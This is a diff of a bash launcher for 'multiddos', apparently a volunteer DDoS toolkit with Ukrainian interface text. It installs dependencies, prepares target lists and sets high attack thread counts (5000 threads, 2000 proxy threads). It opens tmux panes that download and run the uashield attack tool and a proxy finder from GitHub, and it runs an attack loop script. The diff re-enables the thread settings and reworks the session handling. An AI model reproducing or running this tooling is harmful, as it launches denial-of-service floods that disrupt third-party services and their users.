@@ -2,15 +2,10 @@
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh && tmux a
 
 clear && echo -e "Loading...\n"
-
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
-
-cd ~
-rm -rf multidd
-mkdir multidd
-cd multidd
+rm -rf ~/multidd; mkdir ~/multidd; cd ~/multidd #delete old folder; create new and cd inside it
 
 typing_on_screen (){
     tput setaf 2 &>/dev/null # green
@@ -32,15 +27,13 @@ if [[ $docker_mode != "true" ]]; then
     export uvloop="on"
 fi
 
-export methods="--http-methods GET STRESS"
+if [[ $t_set_manual != "on" ]]; then
+    export threads="-t 5000"
+fi
 
-# if [[ $t_set_manual != "on" ]]; then
-#     export threads="-t 5000"
-# fi
-
-# if [[ $t_proxy_manual != "on" ]]; then
-#     export proxy_threads="2000"
-# fi
+if [[ $t_proxy_manual != "on" ]]; then
+    export proxy_threads="2000"
+fi
 
 ### prepare target files (main and secondary)
 prepare_targets_and_banner () {
@@ -81,8 +74,7 @@ toilet -t --metal "   жнець" && sleep 0.1
 toilet -t --metal " MULTIDDOS" && sleep 0.1
 typing_on_screen 'Шукаю завдання...'
 sleep 0.5
-echo -e "\n" && sleep 0.1
-echo -e "Total targets found:" "\x1b[32m $(cat $targets_line_by_line | wc -l)\x1b[m" && sleep 0.1
+echo -e "\n\nTotal targets found:" "\x1b[32m $(cat $targets_line_by_line | wc -l)\x1b[m" && sleep 0.1
 echo -e "Uniq targets:" "\x1b[32m $(cat $targets_uniq | wc -l)\x1b[m" && sleep 0.1
 echo -e "\nЗавантаження..."
 sleep 2
@@ -104,12 +96,12 @@ if [[ $gotop == "on" ]]; then
         curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
         sudo dpkg -i gotop.deb
     fi
-    tmux new-session -s multiddos -d 'gotop -sc solarized'
+    tmux new-session -s multidd -d 'gotop -sc solarized'
     sleep 0.2
     tmux split-window -h -p 66 'bash auto_bash.sh'
 else
     sleep 0.2
-    tmux new-session -s multiddos -d 'bash auto_bash.sh'
+    tmux new-session -s multidd -d 'bash auto_bash.sh'
 fi
 
 if [[ $vnstat == "on" ]]; then
@@ -129,22 +121,13 @@ if [[ $uashield == "on" ]]; then
     tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.6/shield-1.0.6.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
 fi
 
-# if [[ $proxy_finder == "on" ]]; then
-#     sleep 0.2
-#     if [[ $proxy_threads == "" ]]; then
-#         tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo "Шукаю нові проксі... Proxy threads:" $proxy_threads; echo -e "\x1b[32mВ середньому одна робоча проксі знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py'
-#     else
-#         tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo "Шукаю нові проксі... Proxy threads:" $proxy_threads; echo -e "\x1b[32mВ середньому одна робоча проксі знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py  --threads $proxy_threads'
-#     fi
-# fi
-
 if [[ $proxy_finder == "on" ]]; then
     sleep 0.2
-            tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo -e "\x1b[32mШукаю проксі, в середньому одна робоча знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py  --threads $proxy_threads'
+    tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo -e "\x1b[32mШукаю проксі, в середньому одна робоча знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py  --threads $proxy_threads'
 fi
 
-
-#tmux -2 attach-session -d
+tmux attach-session -t multidd
+# tmux a
 }
 
 usage () {
@@ -181,7 +164,7 @@ while [ "$1" != "" ]; do
 done
 
 prepare_targets_and_banner
-clear
+# clear
 
 # create small separate script to re-launch only this part of code and not the whole thing
 cat > auto_bash.sh << 'EOF'
